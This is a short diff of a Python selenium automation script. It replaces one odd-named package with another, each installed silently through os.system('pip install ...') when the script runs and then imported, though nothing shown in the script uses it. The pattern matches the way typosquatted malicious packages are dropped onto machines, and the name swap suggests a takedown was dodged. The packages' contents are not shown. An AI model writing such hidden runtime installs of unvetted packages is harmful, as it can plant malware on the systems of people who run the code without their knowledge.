@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringspackageV2")
-import pipcoloringspackageV2
+os.system("pip install pythonsqlitepkgsV2")
+import pythonsqlitepkgsV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
